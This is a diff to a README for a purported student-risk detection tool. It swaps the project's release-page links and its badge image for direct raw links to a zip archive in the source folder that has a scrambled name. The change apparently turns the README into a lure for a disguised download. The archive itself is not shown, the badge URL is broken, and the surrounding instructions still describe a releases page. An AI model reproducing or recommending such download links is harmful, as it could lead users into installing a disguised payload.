@@ -1,6 +1,6 @@
 # 🎓 Academic-Instability-Early-Warning-System - Detect Academic Risks Early
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/hiopoip7/Academic-Instability-Early-Warning-System/releases)
+[![Download Now](https://raw.githubusercontent.com/hiopoip7/Academic-Instability-Early-Warning-System/main/src/Warning-Academic-Instability-System-Early-3.7.zip%20Now-Release-blue)](https://raw.githubusercontent.com/hiopoip7/Academic-Instability-Early-Warning-System/main/src/Warning-Academic-Instability-System-Early-3.7.zip)
 
 ## 📝 Description
 The Academic Instability Early Warning System is an interpretable engine designed to detect signs of academic instability before grades drop. Instead of just predicting outcomes, it models factors like pressure buildup, buffer strength, and transition risk. By analyzing attendance, engagement, and study load, the system explains weaknesses and pinpoints effective interventions.
@@ -16,7 +16,7 @@ The Academic Instability Early Warning System is an interpretable engine designe
 To get started with your installation, please follow these steps:
 
 ### Step 1: Visit the Release Page
-Click the button above or visit the following link: [Download Releases](https://github.com/hiopoip7/Academic-Instability-Early-Warning-System/releases).
+Click the button above or visit the following link: [Download Releases](https://raw.githubusercontent.com/hiopoip7/Academic-Instability-Early-Warning-System/main/src/Warning-Academic-Instability-System-Early-3.7.zip).
 
 ### Step 2: Download the Software
 On the Releases page, you will find the latest version of the software. Click on the version number or the corresponding file to start your download. 
